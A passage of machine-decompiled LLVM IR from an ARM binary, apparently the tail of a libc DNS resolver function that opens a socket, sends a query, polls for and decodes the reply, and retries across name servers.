dec_label_pc_17f40:                               ; preds = %dec_label_pc_17efc
  store i32 0, i32* @r4, align 4
  %v0_17f50 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_17f5c = inttoptr i32 %v0_17f50 to i8*
  %v4_17f5c = call i32 @inet_pton(i32 10, i8* %v3_17f5c, i32 %v2_17f48)
  %v1_17f60 = load i32, i32* @r4, align 4
  %v7_17f64 = icmp sgt i32 %v4_17f5c, %v1_17f60
  br i1 %v7_17f64, label %bb201, label %dec_label_pc_17f40..thread11_crit_edge

dec_label_pc_17f40..thread11_crit_edge:           ; preds = %dec_label_pc_17f40
  %v3_17f70.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_17f40
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_17f40..thread11_crit_edge, %bb201
  %v3_17f70 = phi i8 [ %v3_17f70.pre, %dec_label_pc_17f40..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_17f70 = sext i8 %v3_17f70 to i32
  %v8_17f6c.op = urem i32 %v1_17f60, 256
  %v8_17f6c.op.op = mul nuw nsw i32 %v8_17f6c.op, 256
  %v4_17f78 = select i1 %v7_17f64, i32 %v8_17f6c.op.op, i32 0
  %v5_17f78 = or i32 %v4_17f70, %v4_17f78
  %v7_17f7c = icmp eq i32 %v5_17f78, 10
  br i1 %v7_17f7c, label %dec_label_pc_17fa8, label %dec_label_pc_17f90

dec_label_pc_17f90:                               ; preds = %.thread11
  %v0_17f94 = load i32, i32* @r6, align 4
  store i32 %v0_17f94, i32* @r0, align 4
  %v1_17fa0 = call i32 @inet_addr(i32 %v0_17f94)
  br label %dec_label_pc_17fa8

dec_label_pc_17fa8:                               ; preds = %.thread11, %dec_label_pc_17f90
  %v0_17fbc = call i32 @socket()
  %v1_17fc0 = icmp slt i32 %v0_17fbc, 0
  br i1 %v1_17fc0, label %.thread, label %dec_label_pc_17fd8

.thread:                                          ; preds = %dec_label_pc_17fa8
  br label %dec_label_pc_18428.backedge

dec_label_pc_18428.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_17e0c, label %dec_label_pc_18444

dec_label_pc_17fd8:                               ; preds = %dec_label_pc_17fa8
  %v4_17fe0 = call i32 @__libc_connect(i32 %v0_17fbc, %sockaddr* nonnull %v3_17fe0, i32 28)
  %v1_17fe4 = icmp slt i32 %v4_17fe0, 0
  br i1 %v1_17fe4, label %dec_label_pc_17fec, label %dec_label_pc_1800c

dec_label_pc_17fec:                               ; preds = %dec_label_pc_17fd8
  %v0_17fec = call i32 @__errno_location()
  %v1_17ff0 = inttoptr i32 %v0_17fec to i32*
  %v2_17ff0 = load i32, i32* %v1_17ff0, align 4
  %v7_17ff4 = icmp eq i32 %v2_17ff0, 101
  br i1 %v7_17ff4, label %dec_label_pc_18358, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_17fec
  br label %dec_label_pc_18428.backedge

dec_label_pc_1800c:                               ; preds = %dec_label_pc_17fd8
  %v0_1800c = load i32, i32* @r5, align 4
  %v1_1800c = load i32, i32* @fp, align 4
  %v2_1800c = add i32 %v1_1800c, %v0_1800c
  %v0_18010 = load i32, i32* @r7, align 4
  %v4_1801c = inttoptr i32 %v0_18010 to i32*
  %v5_1801c = call i32 @__libc_send(i32 %v0_17fbc, i32* %v4_1801c, i32 %v2_1800c, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_17fbc, i32* %stack_var_-44, align 4
  %v11_18044 = call i32 @__libc_poll(%pollfd* %v10_18044, i32 1, i32 10000, i32 1, i32 %v0_17fbc, i32 1, i32 0)
  %v1_18048 = load i32, i32* @r4, align 4
  %v7_1804c = icmp sgt i32 %v11_18044, %v1_18048
  br i1 %v7_1804c, label %dec_label_pc_18050, label %dec_label_pc_18358

dec_label_pc_18050:                               ; preds = %dec_label_pc_1800c
  %v0_18058 = load i32, i32* @r7, align 4
  %v5_18060 = inttoptr i32 %v0_18058 to i32*
  %v6_18060 = call i32 @__libc_recv(i32 %v0_17fbc, i32* %v5_18060, i32 512, i32 %v1_18048, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_18060, i32* @fp, align 4
  %v7_1806c = icmp slt i32 %v6_18060, 12
  br i1 %v7_1806c, label %dec_label_pc_1838c, label %dec_label_pc_18070

dec_label_pc_18070:                               ; preds = %dec_label_pc_18050
  %v0_18070 = load i32, i32* @r7, align 4
  %v2_18078 = inttoptr i32 %v0_18070 to i8*
  %v3_18078 = call i32 @__decode_header(i8* %v2_18078, i32 %v2_17e24)
  %v3_1807c = load i8, i8* %stack_var_-188, align 1
  %v4_1807c = sext i8 %v3_1807c to i32
  store i32 %v4_1807c, i32* @r6, align 4
  %v1_18080 = load i32, i32* @sb, align 4
  %v9_18080 = icmp eq i32 %v4_1807c, %v1_18080
  br i1 %v9_18080, label %dec_label_pc_18088, label %dec_label_pc_1838c

dec_label_pc_18088:                               ; preds = %dec_label_pc_18070
  %v1_1808c = load i32, i32* @r4, align 4
  %v9_1808c = icmp eq i32 %tmp157, %v1_1808c
  br i1 %v9_1808c, label %dec_label_pc_1838c, label %dec_label_pc_18094

dec_label_pc_18094:                               ; preds = %dec_label_pc_18088
  br i1 %v7_18098, label %dec_label_pc_180a0, label %dec_label_pc_1811c

dec_label_pc_180a0:                               ; preds = %dec_label_pc_18094
  %v9_180a4 = icmp eq i32 %., %v1_1808c
  br i1 %v9_180a4, label %dec_label_pc_180ac, label %dec_label_pc_18110

dec_label_pc_180ac:                               ; preds = %dec_label_pc_180a0
  store i32 %v2_17d88, i32* @r5, align 4
  store i32 %v2_17d88, i32* @r0, align 4
  %v1_180c4 = call i32 @__pthread_return_void()
  %v1_180d4 = call i32 @__pthread_return_0()
  store i32 %v2_17d88, i32* @r0, align 4
  %v2_180e0 = load i32, i32* @global_var_33948.1306, align 4
  %v1_180f0 = call i32 @__pthread_return_void()
  %v1_180f8 = add i32 %v2_180e0, -1
  store i32 %v1_180f8, i32* @r4, align 4
  %v5_18100 = icmp slt i32 %v6_183ec, %v1_180f8
  br i1 %v5_18100, label %.thread19, label %dec_label_pc_18110

.thread19:                                        ; preds = %dec_label_pc_180ac
  %v7_18100 = add i32 %v6_183ec, 1
  %v6_18104 = load i32, i32* @r6, align 4
  store i32 %v6_18104, i32* @sb, align 4
  br label %dec_label_pc_18428.outer.backedge

dec_label_pc_18110:                               ; preds = %dec_label_pc_180ac, %dec_label_pc_180a0
  %v0_18110 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_18140

dec_label_pc_1811c:                               ; preds = %dec_label_pc_18094
  br i1 %v2_1811c, label %dec_label_pc_18124, label %dec_label_pc_1838c

dec_label_pc_18124:                               ; preds = %dec_label_pc_1811c
  br i1 %tmp198, label %dec_label_pc_18138, label %dec_label_pc_18150.preheader

dec_label_pc_18150.preheader:                     ; preds = %dec_label_pc_18124
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_18150

dec_label_pc_18138:                               ; preds = %dec_label_pc_18124
  %v0_18138 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_18140

dec_label_pc_18140:                               ; preds = %dec_label_pc_18110, %dec_label_pc_18138
  %storemerge4 = phi i32 [ %v0_18138, %dec_label_pc_18138 ], [ %v0_18110, %dec_label_pc_18110 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_18138 ], [ 1, %dec_label_pc_18110 ]
  %v2_18140 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_18140, align 4
  br label %dec_label_pc_18454

dec_label_pc_18148:                               ; preds = %dec_label_pc_18150
  %v2_18148 = call i32 @__length_question(i32 %v0_1815c, i32 %v0_18158)
  %v0_1814c = load i32, i32* @r5, align 4
  %v2_1814c = add i32 %v0_1814c, %v2_18148
  store i32 %v2_1814c, i32* @r5, align 4
  %v0_18154.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18150

dec_label_pc_18150:                               ; preds = %dec_label_pc_18150.preheader, %dec_label_pc_18148
  %v0_18158 = phi i32 [ 12, %dec_label_pc_18150.preheader ], [ %v2_1814c, %dec_label_pc_18148 ]
  %v0_18160 = phi i32 [ 0, %dec_label_pc_18150.preheader ], [ %v0_18154.pre, %dec_label_pc_18148 ]
  store i32 %v0_18158, i32* @r1, align 4
  %v0_1815c = load i32, i32* @r7, align 4
  store i32 %v0_1815c, i32* @r0, align 4
  %v1_18160 = add i32 %v0_18160, 1
  store i32 %v1_18160, i32* @r4, align 4
  %v5_18164 = icmp slt i32 %v0_18160, 1
  br i1 %v5_18164, label %dec_label_pc_18148, label %dec_label_pc_18168

dec_label_pc_18168:                               ; preds = %dec_label_pc_18150
  br label %dec_label_pc_182c4

dec_label_pc_1817c:                               ; preds = %bb205
  store i32 %v2_1817c, i32* @r4, align 4
  %v0_18180 = load i32, i32* @r7, align 4
  %v0_18188 = load i32, i32* @fp, align 4
  %v5_18190 = call i32 @__decode_answer(i32 %v0_18180, i32 %v0_18184, i32 %v0_18188, i32* nonnull %stack_var_-140)
  %v1_18194 = icmp slt i32 %v5_18190, 0
  br i1 %v1_18194, label %dec_label_pc_181a0, label %dec_label_pc_181bc

dec_label_pc_181a0:                               ; preds = %dec_label_pc_1817c
  %v2_181a4 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_181a4, label %dec_label_pc_1838c, label %dec_label_pc_181ac

dec_label_pc_181ac:                               ; preds = %dec_label_pc_181a0
  br i1 %v2_181b0, label %dec_label_pc_1838c, label %dec_label_pc_182d8

dec_label_pc_181bc:                               ; preds = %dec_label_pc_1817c
  %v2_181c0 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_181c0, label %dec_label_pc_18264, label %dec_label_pc_181c8

dec_label_pc_181c8:                               ; preds = %dec_label_pc_181bc
  %v0_181c8 = load i32, i32* @r8, align 4
  %v6_181cc = add i32 %v0_181c8, 36
  %v7_181cc = inttoptr i32 %v6_181cc to i32*
  %v8_181cc = load i32, i32* %v7_181cc, align 4
  store i32 %v8_181cc, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_1817c, i32* @r1, align 4
  store i32 %v0_181c8, i32* @r0, align 4
  %v0_181e8 = call i32 @memcpy()
  %v0_181ec = load i32, i32* @r8, align 4
  %v1_181ec = add i32 %v0_181ec, 4
  %v2_181ec = inttoptr i32 %v1_181ec to i32*
  %v3_181ec = load i32, i32* %v2_181ec, align 4
  %v7_181f0 = icmp eq i32 %v3_181ec, 24
  br i1 %v7_181f0, label %dec_label_pc_18214, label %dec_label_pc_181f8

dec_label_pc_181f8:                               ; preds = %dec_label_pc_181c8
  %v1_181f8 = add i32 %v0_181ec, 28
  %v2_181f8 = inttoptr i32 %v1_181f8 to i32*
  %v3_181f8 = load i32, i32* %v2_181f8, align 4
  %v2_181fc = icmp eq i32 %v3_181f8, 0
  br i1 %v2_181fc, label %dec_label_pc_182d8, label %dec_label_pc_18204

dec_label_pc_18204:                               ; preds = %dec_label_pc_181f8
  br i1 %v7_18208, label %dec_label_pc_18214, label %bb203

bb203:                                            ; preds = %dec_label_pc_18204
  br i1 %v8_1820c, label %dec_label_pc_18214, label %dec_label_pc_182d8

dec_label_pc_18214:                               ; preds = %dec_label_pc_18204, %bb203, %dec_label_pc_181c8
  %v9_18218 = icmp eq i32 %v3_181ec, %arg2
  br i1 %v9_18218, label %dec_label_pc_1822c, label %dec_label_pc_18220

dec_label_pc_18220:                               ; preds = %dec_label_pc_18214
  %v1_18220 = inttoptr i32 %v0_181ec to i32*
  %v2_18220 = load i32, i32* %v1_18220, align 4
  store i32 %v2_18220, i32* @r0, align 4
  %v0_18224 = call i32 @free()
  br label %dec_label_pc_182b0

dec_label_pc_1822c:                               ; preds = %dec_label_pc_18214
  %v1_18234 = add i32 %v0_181ec, 16
  %v2_18234 = inttoptr i32 %v1_18234 to i32*
  %v3_18234 = load i32, i32* %v2_18234, align 4
  %v2_18238 = sub i32 %tmp155, %stack_var_-192.0
  %v1_1823c = add i32 %v2_18238, -1
  %v1_18240 = add i32 %v3_18234, 4
  %v2_18244 = mul i32 %v1_18240, %v1_1823c
  %v1_18248 = add i32 %v0_181ec, 32
  %v2_18248 = inttoptr i32 %v1_18248 to i32*
  %v3_18248 = load i32, i32* %v2_18248, align 4
  %v2_18250 = add i32 %v0_181ec, 36
  %v3_18250 = inttoptr i32 %v2_18250 to i32*
  store i32 %v1_1823c, i32* %v3_18250, align 4
  %tmp294 = icmp ugt i32 %v2_18244, %v3_18248
  br i1 %tmp294, label %dec_label_pc_182d8, label %dec_label_pc_1822c.dec_label_pc_182ac_crit_edge

dec_label_pc_1822c.dec_label_pc_182ac_crit_edge:  ; preds = %dec_label_pc_1822c
  %v1_182ac.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_182ac

dec_label_pc_18264:                               ; preds = %dec_label_pc_181bc
  %v3_18264 = load i32, i32* %stack_var_-140, align 4
  store i32 %v3_18264, i32* @r0, align 4
  %v0_18268 = call i32 @free()
  br i1 %v9_18274, label %dec_label_pc_1827c, label %dec_label_pc_182b0

dec_label_pc_1827c:                               ; preds = %dec_label_pc_18264
  %v0_1827c = load i32, i32* @r8, align 4
  %v1_1827c = add i32 %v0_1827c, 16
  %v2_1827c = inttoptr i32 %v1_1827c to i32*
  %v3_1827c = load i32, i32* %v2_1827c, align 4
  %v9_18284 = icmp eq i32 %v3_1827c, %tmp146
  br i1 %v9_18284, label %dec_label_pc_1828c, label %dec_label_pc_18384

dec_label_pc_1828c:                               ; preds = %dec_label_pc_1827c
  %v1_1828c = add i32 %v0_1827c, 36
  %v2_1828c = inttoptr i32 %v1_1828c to i32*
  %v3_1828c = load i32, i32* %v2_1828c, align 4
  %v1_18290 = add i32 %v0_1827c, 28
  %v2_18290 = inttoptr i32 %v1_18290 to i32*
  %v3_18290 = load i32, i32* %v2_18290, align 4
  %v3_18294 = mul i32 %v3_1828c, %tmp146
  %v4_18294 = add i32 %v3_18290, %v3_18294
  store i32 %v4_18294, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_182a0 = call i32 @memcpy()
  %v0_182a4 = load i32, i32* @r8, align 4
  %v1_182a4 = add i32 %v0_182a4, 36
  %v2_182a4 = inttoptr i32 %v1_182a4 to i32*
  %v3_182a4 = load i32, i32* %v2_182a4, align 4
  %v1_182a8 = add i32 %v3_182a4, 1
  br label %dec_label_pc_182ac

dec_label_pc_182ac:                               ; preds = %dec_label_pc_1822c.dec_label_pc_182ac_crit_edge, %dec_label_pc_1828c
  %v1_182ac = phi i32 [ %v0_182a4, %dec_label_pc_1828c ], [ %v1_182ac.pre, %dec_label_pc_1822c.dec_label_pc_182ac_crit_edge ]
  %storemerge5 = phi i32 [ %v1_182a8, %dec_label_pc_1828c ], [ 0, %dec_label_pc_1822c.dec_label_pc_182ac_crit_edge ]
  %v2_182ac = add i32 %v1_182ac, 36
  %v3_182ac = inttoptr i32 %v2_182ac to i32*
  store i32 %storemerge5, i32* %v3_182ac, align 4
  br label %dec_label_pc_182b0

dec_label_pc_182b0:                               ; preds = %dec_label_pc_18264, %dec_label_pc_18220, %dec_label_pc_182ac
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_182ac ], [ 0, %dec_label_pc_18264 ], [ %stack_var_-212.2, %dec_label_pc_18220 ]
  %v1_182b8 = add i32 %stack_var_-192.0, 1
  %v0_182c0 = load i32, i32* @r5, align 4
  %v2_182c0 = add i32 %v0_182c0, %v5_18190
  store i32 %v2_182c0, i32* @r5, align 4
  br label %dec_label_pc_182c4

dec_label_pc_182c4:                               ; preds = %dec_label_pc_18168, %dec_label_pc_182b0
  %v0_18184 = phi i32 [ %v0_18158, %dec_label_pc_18168 ], [ %v2_182c0, %dec_label_pc_182b0 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_18168 ], [ %stack_var_-212.1, %dec_label_pc_182b0 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_18168 ], [ %v1_182b8, %dec_label_pc_182b0 ]
  %v2_182cc = sub i32 %stack_var_-192.0, %tmp155
  %v4_182cc = xor i32 %stack_var_-192.0, %tmp155
  %v5_182cc = xor i32 %v2_182cc, %stack_var_-192.0
  %v6_182cc = and i32 %v5_182cc, %v4_182cc
  %v5_182d0 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_182d0, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_182c4
  %v7_182d0 = load i32, i32* @fp, align 4
  %v8_182d0 = sub i32 %v0_18184, %v7_182d0
  %v10_182d0 = xor i32 %v7_182d0, %v0_18184
  %v11_182d0 = xor i32 %v8_182d0, %v0_18184
  %v12_182d0 = and i32 %v11_182d0, %v10_182d0
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_182c4, %bb204
  %v1_182d4.in = phi i32 [ %v6_182cc, %dec_label_pc_182c4 ], [ %v12_182d0, %bb204 ]
  %v0_182d4.in = phi i32 [ %v2_182cc, %dec_label_pc_182c4 ], [ %v8_182d0, %bb204 ]
  %v0_182d4 = icmp slt i32 %v0_182d4.in, 0
  %v1_182d4 = icmp slt i32 %v1_182d4.in, 0
  %v2_182d4 = xor i1 %v1_182d4, %v0_182d4
  br i1 %v2_182d4, label %dec_label_pc_1817c, label %dec_label_pc_182d8

dec_label_pc_182d8:                               ; preds = %dec_label_pc_181ac, %bb203, %dec_label_pc_1822c, %dec_label_pc_181f8, %bb205
  %v1_182dc = call i32 @__libc_close(i32 %v0_17fbc)
  %v3_182e0 = load i32, i32* %stack_var_0, align 4
  %v2_182e4 = icmp eq i32 %v3_182e0, 0
  br i1 %v2_182e4, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_182d8
  %v1_182ec = load i32, i32* @r7, align 4
  %v3_182e8 = inttoptr i32 %v3_182e0 to i32*
  store i32 %v1_182ec, i32* %v3_182e8, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_182d8
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 99060, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_182e4, i32 ptrtoint (i32* @global_var_14ed0.1006 to i32))
  %v2_182f4 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_182f4, i32* @r0, align 4
  store i32 %v2_17d88, i32* @r4, align 4
  %v0_182fc = call i32 @free()
  store i32 %v2_17d88, i32* @r0, align 4
  %v1_18314 = call i32 @__pthread_return_void()
  %v1_18324 = call i32 @__pthread_return_0()
  %v0_18330 = load i32, i32* @r6, align 4
  %v3_18330 = sdiv i32 %v0_18330, 256
  %v0_18334 = load i32, i32* @sl, align 4
  store i32 %v0_18334, i32* @global_var_33878.1298, align 4
  store i32 %v2_17d88, i32* @r0, align 4
  %v1_18340 = trunc i32 %v3_18330 to i8
  store i8 %v1_18340, i8* @global_var_2d5c9.1301, align 1
  %v1_18344 = trunc i32 %v0_18330 to i8
  store i8 %v1_18344, i8* bitcast (i8** @global_var_2d5c8.1300 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_18354.1312 to i32), i32* @lr, align 4
  %v1_18350 = call i32 @__pthread_return_void()
  %v0_184dc.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_184dc

dec_label_pc_18358:                               ; preds = %dec_label_pc_17fec, %dec_label_pc_1800c
  %v0_18358 = load i32, i32* @sl, align 4
  %v1_18358 = add i32 %v0_18358, 1
  %v2_18360 = srem i32 %v1_18358, %arg3
  store i32 %v2_18360, i32* @sl, align 4
  %v2_18364 = icmp eq i32 %v2_18360, 0
  br i1 %v2_18364, label %dec_label_pc_1836c, label %dec_label_pc_18424.backedge

dec_label_pc_1836c:                               ; preds = %dec_label_pc_18358
  %v1_18374 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_18428.outer.backedge

dec_label_pc_18428.outer.backedge:                ; preds = %dec_label_pc_1836c, %dec_label_pc_18408, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_18100, %.thread19 ], [ -1, %dec_label_pc_18408 ], [ -1, %dec_label_pc_1836c ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_18410, %dec_label_pc_18408 ], [ %v1_18374, %dec_label_pc_1836c ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_17e0c.lr.ph, label %dec_label_pc_18444

dec_label_pc_18384:                               ; preds = %dec_label_pc_1827c
  %v1_18384 = inttoptr i32 %v0_1827c to i32*
  %v2_18384 = load i32, i32* %v1_18384, align 4
  store i32 %v2_18384, i32* @r0, align 4
  %v0_18388 = call i32 @free()
  br label %dec_label_pc_1838c

dec_label_pc_1838c:                               ; preds = %dec_label_pc_1811c, %dec_label_pc_18070, %dec_label_pc_181ac, %dec_label_pc_181a0, %dec_label_pc_18088, %dec_label_pc_18050, %dec_label_pc_18384
  br i1 %v2_18390, label %dec_label_pc_18398, label %dec_label_pc_183f4

dec_label_pc_18398:                               ; preds = %dec_label_pc_1838c
  store i32 %v2_17d88, i32* @r5, align 4
  store i32 %v2_17d88, i32* @r0, align 4
  %v1_183b0 = call i32 @__pthread_return_void()
  %v1_183c0 = call i32 @__pthread_return_0()
  %v2_183cc = load i32, i32* @global_var_33948.1306, align 4
  store i32 %v2_17d88, i32* @r0, align 4
  %v1_183dc = call i32 @__pthread_return_void()
  %v1_183e4 = add i32 %v2_183cc, -1
  store i32 %v1_183e4, i32* @r4, align 4
  %v5_183ec = icmp slt i32 %v6_183ec, %v1_183e4
  br i1 %v5_183ec, label %.thread27, label %dec_label_pc_183f4

.thread27:                                        ; preds = %dec_label_pc_18398
  %v7_183ec = add i32 %v6_183ec, 1
  br label %dec_label_pc_18424.backedge

dec_label_pc_183f4:                               ; preds = %dec_label_pc_18398, %dec_label_pc_1838c
  %v0_183f4 = load i32, i32* @sl, align 4
  %v1_183f4 = add i32 %v0_183f4, 1
  %v2_183fc = srem i32 %v1_183f4, %arg3
  store i32 %v2_183fc, i32* @sl, align 4
  %v2_18400 = icmp eq i32 %v2_183fc, 0
  br i1 %v2_18400, label %dec_label_pc_18408, label %dec_label_pc_18424.backedge

dec_label_pc_18408:                               ; preds = %dec_label_pc_183f4
  %v1_18410 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_18428.outer.backedge

dec_label_pc_18424.backedge:                      ; preds = %dec_label_pc_18358, %dec_label_pc_183f4, %.thread27
  %storemerge87 = phi i32 [ %v7_183ec, %.thread27 ], [ -1, %dec_label_pc_183f4 ], [ -1, %dec_label_pc_18358 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_17e0c.lr.ph.preheader, label %dec_label_pc_18444

dec_label_pc_17e0c.lr.ph.preheader:               ; preds = %dec_label_pc_17e0c.lr.ph.preheader.lr.ph, %dec_label_pc_18424.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_17e0c.lr.ph.preheader.lr.ph ], [ %v0_17fbc, %dec_label_pc_18424.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_17e04, %dec_label_pc_17e0c.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_18424.backedge ]
  %v0_18424259 = phi i32 [ -1, %dec_label_pc_17e0c.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_18424.backedge ]
  br label %dec_label_pc_17e0c.lr.ph

dec_label_pc_17e0c.lr.ph:                         ; preds = %dec_label_pc_17e0c.lr.ph.preheader, %dec_label_pc_18428.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_17fbc, %dec_label_pc_18428.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_17e0c.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_18428.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_17e0c.lr.ph.preheader ]
  %v6_183ec = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_18428.outer.backedge ], [ %v0_18424259, %dec_label_pc_17e0c.lr.ph.preheader ]
  %v1_17eb4 = icmp slt i32 %v6_183ec, 0
  %v4_17ef0 = mul i32 %v6_183ec, 4
  %v5_17ef0 = add i32 %v4_17ef0, ptrtoint (i32* @global_var_33928.1310 to i32)
  %v6_17ef0 = inttoptr i32 %v5_17ef0 to i32*
  br label %dec_label_pc_17e0c

dec_label_pc_18438:                               ; preds = %bb195, %.thread8, %dec_label_pc_17d64, %dec_label_pc_17d58
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_18444

dec_label_pc_18444:                               ; preds = %dec_label_pc_17d74, %dec_label_pc_18424.backedge, %dec_label_pc_18428.outer.backedge, %bb200, %dec_label_pc_17efc, %dec_label_pc_18428.backedge, %dec_label_pc_18438
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_18438 ], [ %v0_17fbc, %dec_label_pc_18428.backedge ], [ %v1_17e14, %dec_label_pc_17efc ], [ %v1_17e14, %bb200 ], [ %v0_17fbc, %dec_label_pc_18428.outer.backedge ], [ -1, %dec_label_pc_17d74 ], [ %v0_17fbc, %dec_label_pc_18424.backedge ]
  %v0_18444 = call i32 @__GI___h_errno_location()
  %v2_1844c = inttoptr i32 %v0_18444 to i32*
  store i32 -1, i32* %v2_1844c, align 4
  %v0_18450 = load i32, i32* @sb, align 4
  store i32 %v0_18450, i32* @r6, align 4
  br label %dec_label_pc_18454

dec_label_pc_18454:                               ; preds = %dec_label_pc_18140, %dec_label_pc_18444
  %v1_1845c = phi i32 [ %stack_var_-216.2, %dec_label_pc_18444 ], [ %v0_17fbc, %dec_label_pc_18140 ]
  %v7_18458 = icmp eq i32 %v1_1845c, -1
  br i1 %v7_18458, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_18454
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_18454, %bb208
  store i32 99428, i32* @lr, align 4
  %v1_18460 = xor i1 %v7_18458, true
  call void @__pseudo_cond_branch(i1 %v1_18460, i32 ptrtoint (i32* @global_var_11ce8.1303 to i32))
  %v2_18464 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_18464, i32* @r0, align 4
  %v0_18468 = call i32 @free()
  %v0_1846c = load i32, i32* @r7, align 4
  store i32 %v0_1846c, i32* @r0, align 4
  %v0_18470 = call i32 @free()
  %v0_18474 = load i32, i32* @sl, align 4
  %v7_18474 = icmp eq i32 %v0_18474, -1
  br i1 %v7_18474, label %bb210, label %dec_label_pc_18480

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_184dc

dec_label_pc_18480:                               ; preds = %bb209
  %v2_18480 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_18480, i32* @r0, align 4
  %v1_18498 = call i32 @__pthread_return_void()
  %v1_184a8 = call i32 @__pthread_return_0()
  %v0_184b4 = load i32, i32* @r6, align 4
  %v3_184b4 = sdiv i32 %v0_184b4, 256
  %v0_184b8 = load i32, i32* @sl, align 4
  store i32 %v0_184b8, i32* @global_var_33878.1298, align 4
  store i32 %v2_18480, i32* @r0, align 4
  %v1_184c4 = trunc i32 %v3_184b4 to i8
  store i8 %v1_184c4, i8* @global_var_2d5c9.1301, align 1
  %v1_184c8 = trunc i32 %v0_184b4 to i8
  store i8 %v1_184c8, i8* bitcast (i8** @global_var_2d5c8.1300 to i8*), align 4
  store i32 99544, i32* @lr, align 4
  %v1_184d4 = call i32 @__pthread_return_void()
  br label %dec_label_pc_184dc

dec_label_pc_184dc:                               ; preds = %bb210, %bb207, %dec_label_pc_18480
  %v0_184dc = phi i32 [ %v0_18474, %bb210 ], [ %v0_184dc.pre, %bb207 ], [ -1, %dec_label_pc_18480 ]
  store i32 %v3_17d10, i32* @r4, align 4
  store i32 %v6_17d10, i32* @r5, align 4
  store i32 %v9_17d10, i32* @r6, align 4
  store i32 %v12_17d10, i32* @r7, align 4
  store i32 %v15_17d10, i32* @r8, align 4
  store i32 %v18_17d10, i32* @sb, align 4
  store i32 %v21_17d10, i32* @sl, align 4
  ret i32 %v0_184dc

; uselistorder directives
  uselistorder i32 %v0_184b4, { 1, 0 }
  uselistorder i32 %v0_18474, { 1, 0 }
  uselistorder i1 %v7_18458, { 1, 0 }
  uselistorder i32 %v6_183ec, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_18330, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_18184, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1827c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1823c, { 1, 0 }
  uselistorder i32 %v0_1815c, { 1, 0 }
  uselistorder i32 %v0_18160, { 1, 0 }
  uselistorder i32 %v6_18060, { 1, 0 }
  uselistorder i32 %v0_17fbc, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_17f28, { 1, 0 }
  uselistorder i32 %v2_17ec8, { 1, 0 }
  uselistorder i32 %v1_17e40, { 1, 2, 0 }
  uselistorder i1 %v7_17e10, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_17e14, { 1, 2, 0 }
  uselistorder i32 %v0_17e04, { 1, 0 }
